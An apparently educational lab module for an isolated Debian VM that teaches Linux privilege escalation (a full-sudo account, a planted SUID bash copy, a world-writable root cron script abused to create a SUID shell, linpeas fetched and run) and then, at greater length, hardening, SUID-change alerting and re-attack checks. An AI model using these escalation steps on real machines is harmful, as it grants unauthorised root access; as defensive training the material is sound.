---
title: "Scenario 06 - Linux privilege escalation and blue-team hardening (on `blue`)"
---

# Scenario 06 - Linux privilege escalation and blue-team hardening (on `blue`)

> **Lab-only.** `blue` (10.13.37.40) is a Debian 12 VM we own on the isolated a local model net. No route to
> the real LAN or the internet. This module is half attack, half defence, and the **defence is the main
> event**: `blue` is the box the student hardens.

| | |
|---|---|
| **Goal** | From a low-privilege shell, escalate to root two ways (a legitimate `sudo` path and a planted misconfig), then harden `blue` so both paths fail. |
| **Target** | `blue` 10.13.37.40 (Debian 12). You hold `analyst` / `BlueLab-2026` (from scenario 05, or given). |
| **Difficulty** | Beginner -> Intermediate |
| **Est. time** | 75-120 min |
| **Prereqs** | Scenario 05 (you have `analyst`'s password, or an `analyst` SSH shell). Basic Linux file permissions. |
| **Start-from** | `kali` at `tools-ready`; `blue` at `clean-baseline`. `blue` is off by default - start it first. |

## MITRE ATT&CK mapping
- **Privilege Escalation / Abuse Elevation Control Mechanism: Sudo and Sudo Caching - T1548.003** (the `sudo` path).
- **Privilege Escalation / Abuse Elevation Control Mechanism: Setuid and Setgid - T1548.001** (SUID binary).
- **Privilege Escalation / Scheduled Task/Job: Cron - T1053.003** (writable root cron script).
- **Privilege Escalation / Hijack Execution Flow: Path Interception by PATH Environment Variable - T1574.007**.
- **Privilege Escalation / Exploitation for Privilege Escalation - T1068** (the general class linpeas hunts for).
- Defensive counterparts: least privilege, restrict file/dir permissions, audit execution (M1026, M1022, M1047, M1038).

---

## 0. Set up + get the foothold

```bash
# on the host
virsh -c qemu:///system start blue
virsh -c qemu:///system list --all          # blue should be 'running'
```

Land your low-privilege foothold. In a real attack you would have phished or cracked this (scenario 05);
here you are given it:

```bash
# on kali
ssh analyst@10.13.37.40          # password: BlueLab-2026
id
```
**What you should see:** `uid=1000(analyst) gid=1000(analyst) groups=1000(analyst),27(sudo)`. You are a
normal user who happens to be in the `sudo` group. Note the flag you are hunting: `/root/lab/flag.txt`
(you cannot read it yet).

```bash
cat /root/lab/flag.txt        # -> Permission denied.  That is the target.
```

---

## 1. Enumerate for privilege escalation

### 1a. The two-minute manual checklist (do this first, always)

```bash
# on blue, as analyst
sudo -l                                   # what can I run as root?  (T1548.003)
find / -perm -4000 -type f 2>/dev/null    # SUID binaries (run as their owner)  (T1548.001)
ls -la /etc/cron.d /etc/cron.daily 2>/dev/null ; cat /etc/crontab   # scheduled jobs  (T1053.003)
find / -writable -type d 2>/dev/null | grep -vE '^/(proc|sys|run|tmp|dev)' | head   # writable dirs
echo "$PATH"                              # any writable/relative dir early in PATH?  (T1574.007)
uname -a ; cat /etc/os-release            # kernel + distro (for kernel-exploit hunting, T1068)
```
**What you should see:**
- `sudo -l` prompts for your password, then prints `(ALL : ALL) ALL` - `analyst` may run *anything* as
  root. That is your first, legitimate escalation path.
- `find -perm -4000` lists the normal SUID set (`sudo`, `su`, `mount`, `passwd`, `pkexec` ...). On a clean
  `blue` nothing here is exploitable yet - in step 3 we plant a bad one to learn the method.

### 1b. Automated enumeration with linpeas

linpeas scores every privesc vector for you. `blue` has no internet, so copy linpeas over from Kali.

Find linpeas on Kali (it ships with the `peass-ng` package; download the latest only if Kali is online):
```bash
# on kali - locate the bundled copy
find / -iname 'linpeas.sh' 2>/dev/null ; dpkg -L peass-ng 2>/dev/null | grep linpeas
# if online and you want the newest:  curl -fsSL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh
```
Serve it from Kali and pull it onto `blue` over the lab net:
```bash
# on kali - from the directory that contains linpeas.sh (adjust the path from the find above)
cd "$(dirname "$(find / -iname linpeas.sh 2>/dev/null | head -1)")"
python3 -m http.server 8000
```
```bash
# on blue, in another terminal (as analyst)
wget http://10.13.37.10:8000/linpeas.sh -O /tmp/linpeas.sh    # or: curl -O http://10.13.37.10:8000/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh | tee /tmp/linpeas.out
```
Stop the Kali web server with `Ctrl-C` when the transfer is done.

**What you should see:** a long colourised report. The important part is anything flagged **red/yellow**
("99% PE vector"). On clean `blue` the standout is the `sudo` privilege from 1a. After step 3, linpeas
will also flag the writable cron script and the odd SUID binary.

---

## 2. Escalate via the legitimate sudo path (T1548.003)

`analyst` is in `sudo` with `(ALL) ALL`, the most common real-world "privesc" of all: an admin account
whose password you now hold.

```bash
# on blue, as analyst
sudo -i                        # or: sudo su -   /   sudo bash
id                             # uid=0(root)
cat /root/lab/flag.txt         # the flag
```
**What you should see:** `uid=0(root)` and `FLAG-BLUE{harden-me-then-reattack}`. You own the box.

This path exists purely because `analyst` has full sudo. The defence (step 4) is to take that away or
constrain it.

---

## 3. Escalate via a misconfiguration (teach the method)

The `sudo` path only worked because the account was over-privileged. Real privesc usually exploits a
*misconfiguration* left by a busy admin. `blue` is clean, so we act as that careless admin, plant one bad
setting, then exploit it as `analyst`. This is how you learn to *spot* and *fix* them.

Pick either vector (both are common findings).

### 3a. SUID root shell (T1548.001)
```bash
# as ROOT (you are root from step 2) - the "mistake": a SUID copy of bash
cp /bin/bash /usr/local/bin/maint-backup
chmod 4755 /usr/local/bin/maint-backup      # SUID bit -> runs as its owner (root)
exit                                          # drop back to analyst
```
Now exploit it as the low-priv user:
```bash
# on blue, as analyst
ls -la /usr/local/bin/maint-backup           # -rwsr-xr-x root root  (the 's' = SUID)
/usr/local/bin/maint-backup -p               # -p keeps the elevated euid
id                                            # euid=0(root)
cat /root/lab/flag.txt
```
**What you should see:** `-rwsr-xr-x ... root root`, then after `-p`, `euid=0(root)` and the flag. A SUID
copy of a shell is an instant root. (This is exactly what linpeas would highlight in red.)

### 3b. Writable root cron script (T1053.003) - optional second vector
```bash
# as ROOT - the "mistake": a root cron job running a world-writable script
mkdir -p /opt/scripts
cat >/opt/scripts/cleanup.sh <<'EOF'
#!/bin/sh
find /tmp -type f -mmin +60 -delete
EOF
chmod 777 /opt/scripts/cleanup.sh            # world-writable = the bug
echo '* * * * * root /opt/scripts/cleanup.sh' > /etc/cron.d/cleanup
exit
```
Exploit as `analyst` - append a command that runs when root's cron fires:
```bash
# on blue, as analyst
ls -la /opt/scripts/cleanup.sh               # -rwxrwxrwx  (anyone can edit it)
printf '\ncp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash\n' >> /opt/scripts/cleanup.sh
# wait up to 60s for the minute cron to run, then:
sleep 65 ; /tmp/rootbash -p
id                                            # euid=0(root)
```
**What you should see:** after the cron tick, `/tmp/rootbash` exists SUID-root; `-p` gives `euid=0`. You
changed what *root* runs because you could write its script.

---

## 4. Defence - harden `blue` (the main event)

Fix the account, the files, and add auditing so the next attempt is both blocked and visible.

### 4a. Least privilege: stop analyst being instant-root (T1548.003)
Choose the level that fits the account's real job.

```bash
# on blue as root (ssh root@10.13.37.40, or console)

# strongest: analyst is a normal user, not an admin at all
gpasswd -d analyst sudo            # remove from the sudo group
# OR, if analyst genuinely needs a few admin tasks, scope + log it instead of full ALL:
cat >/etc/sudoers.d/analyst <<'EOF'
# analyst may only restart the app service, and every sudo use is logged
analyst ALL=(root) /usr/bin/systemctl restart myapp.service
Defaults:analyst  log_output, log_input
Defaults          logfile="/var/log/sudo.log"
EOF
visudo -cf /etc/sudoers.d/analyst  # syntax check - MUST say "parsed OK" before you trust it
chmod 440 /etc/sudoers.d/analyst
```
Also make sure `sudo` always demands a password and never caches forever (defence in depth):
```bash
echo 'Defaults timestamp_timeout=0, !authenticate_root' >/etc/sudoers.d/00-tighten 2>/dev/null; \
  echo 'Defaults timestamp_timeout=0' >/etc/sudoers.d/00-tighten ; visudo -cf /etc/sudoers.d/00-tighten
```

### 4b. Remove the SUID / cron misconfigs and stop new ones (T1548.001, T1053.003)
```bash
# on blue as root
# remove the bad SUID binary we planted, and any stray rootbash
rm -f /usr/local/bin/maint-backup /tmp/rootbash
# fix the cron script: root-owned, not writable by others; or remove it
chown root:root /opt/scripts/cleanup.sh && chmod 755 /opt/scripts/cleanup.sh
# (or drop the job entirely:)  rm -f /etc/cron.d/cleanup /opt/scripts/cleanup.sh

# establish a SUID baseline so you can detect future additions
find / -perm -4000 -type f 2>/dev/null | sort > /root/suid-baseline.txt
wc -l /root/suid-baseline.txt
```
**What you should see:** the planted files gone; `cleanup.sh` now `-rwxr-xr-x root root`; a baseline list
of the *expected* SUID binaries saved for later diffing.

### 4c. Enable auditing so the next attempt is visible (M1047)
`blue` is offline, so use controls that need no package install:

```bash
# on blue as root
# 1) sudo already logs to auth.log; confirm you can see step 2/4a activity:
grep -E 'sudo|COMMAND=' /var/log/auth.log | tail
# 2) a self-check timer that alerts on any NEW SUID binary vs the baseline (no internet needed)
cat >/usr/local/sbin/suid-watch.sh <<'EOF'
#!/bin/sh
find / -perm -4000 -type f 2>/dev/null | sort > /root/suid-now.txt
if ! diff -q /root/suid-baseline.txt /root/suid-now.txt >/dev/null; then
  logger -p auth.warning "SUID CHANGE DETECTED: $(diff /root/suid-baseline.txt /root/suid-now.txt | tr '\n' ' ')"
fi
EOF
chmod 700 /usr/local/sbin/suid-watch.sh
echo '*/5 * * * * root /usr/local/sbin/suid-watch.sh' > /etc/cron.d/suid-watch
```
For production-grade auditing, install `auditd` (`apt-get install auditd`, in a controlled internet
window) and add rules for `execve` and SUID files. Note it here as the real answer; the timer above is the
offline lab stand-in.

---

## 5. Prove the fix (re-attack)

Drop back to `analyst` and re-run every path from steps 2-3:

```bash
# on kali
ssh analyst@10.13.37.40
```
```bash
# on blue, as analyst
sudo -l                          # 4a: should say analyst may run nothing (or only the one scoped cmd)
sudo -i                          # should be refused / "not in the sudoers file" or demand + reject
/usr/local/bin/maint-backup -p   # 4b: "No such file or directory" - the SUID shell is gone
cat /root/lab/flag.txt           # Permission denied - you are back to a normal user
```
**What you should see:** `sudo` no longer hands over root; the SUID binary is gone; the flag is
unreachable. If you kept a scoped sudoers rule, confirm `sudo -l` shows *only* the one allowed command.

**Prove the auditing works** - try to plant a new SUID as root, then confirm the watcher catches it:
```bash
# as root, simulate a fresh misconfig, then run the watcher
cp /bin/bash /usr/local/bin/test-suid && chmod 4755 /usr/local/bin/test-suid
/usr/local/sbin/suid-watch.sh ; grep 'SUID CHANGE' /var/log/auth.log | tail -1
rm -f /usr/local/bin/test-suid        # clean up the test
```
**What you should see:** an `auth.warning` log line naming the new `/usr/local/bin/test-suid`. You now get
*alerted* to the misconfig instead of getting rooted by it.

Side-by-side lesson (attacker action -> the one control that stopped it):
| Attack | Control that killed it |
|---|---|
| `sudo -i` to root | remove analyst from `sudo` / scope + log sudoers (4a) |
| SUID `maint-backup -p` | remove SUID, baseline + watch SUID set (4b, 4c) |
| writable cron script | root-own, non-world-writable cron scripts (4b) |
| any future misconfig | auth.log + SUID-watch timer alerting (4c) |

---

## Flags / evidence
- The flag captured **before** hardening (`FLAG-BLUE{harden-me-then-reattack}`) via the sudo path and via
  the SUID path.
- linpeas output showing the red-flagged vectors (before) vs a clean run (after).
- Proof-of-fix: `sudo -l` denying analyst, the failed `maint-backup -p`, and the `SUID CHANGE DETECTED`
  log line.

## Cleanup / reset
The fastest reset undoes every planted misconfig and hardening at once:
```bash
# on the host - shut down first, then revert
virsh -c qemu:///system shutdown blue ; sleep 5
virsh -c qemu:///system snapshot-revert blue clean-baseline
```
(If it will not shut down: `virsh -c qemu:///system destroy blue` then the revert - `blue` is disposable.)
On Kali, stop any leftover `python3 -m http.server` and remove `linpeas.sh` copies.

## Go deeper
- Research: why does 'sudo -i' work for analyst but not for a normal user, and what exactly does the sudo group grant?
- Research: how does a SUID bit let a copy of bash run as root, and how do I audit which SUID files are safe?
- Research: linpeas printed a red '99% PE' line about a writable service file - walk me through exploiting and then fixing it
